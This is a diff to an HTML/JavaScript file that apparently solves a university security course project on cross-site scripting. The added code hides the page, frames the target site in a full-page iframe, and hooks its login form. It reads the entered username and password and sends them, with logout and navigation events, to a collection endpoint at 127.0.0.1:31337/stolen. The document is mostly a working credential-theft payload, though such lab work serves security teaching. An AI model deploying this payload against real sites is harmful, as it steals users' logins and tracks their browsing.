@@ -1,5 +1,3 @@
-<! --- http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html --->
-
 <html>
 <meta charset="utf-8">
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
@@ -14,6 +12,13 @@ function payload(attacker) {
     });
   }
 
+  $('body').children().hide();
+  
+  var queryUsername = "";
+  var queryPassword = "";
+  var queryURL = "";
+  var queryDial = "";
+  
   $('<iframe>')
   .css({
   position: 'absolute',
@@ -25,10 +30,29 @@ function payload(attacker) {
   background: '#fff'
   })
   .attr('src', "http://cis551.cis.upenn.edu/project3/")
-  .appendTo("html")
-  .load(function() {
-	this.find('form').submit(function(){alert(0);});
-  });
+  .attr('name', 'ifr')
+  .attr('id', 'ifr')
+  .appendTo("body")
+  .load(function(){
+	$('#ifr').contents().find("#log-in-btn").click(function(){
+		queryUsername = $('#ifr').contents().find("#username").val();
+		queryPassword = $('#ifr').contents().find("#userpass").val();
+		queryDial = "http://127.0.0.1:31337/stolen?event=login&user="+queryUsername+"&pass="+queryPassword;
+		$.get(queryDial);
+	});
+  })
+  .load(function(){
+	$('#ifr').contents().find("#log-out-btn").click(function(){
+		queryDial = "http://127.0.0.1:31337/stolen?event=logout&user=" + queryUsername;
+		$.get(queryDial);
+	});
+  })
+  .load(function(){
+		queryURL = $("#ifr").contents().get(0).location.href;
+		queryDial = "http://127.0.0.1:31337/stolen?event=nav&user="+queryUsername+"&url="+queryURL;
+		$.get(queryDial);
+  })
+  ;
 }
 
 function makeLink(xssdefense, target, attacker) {
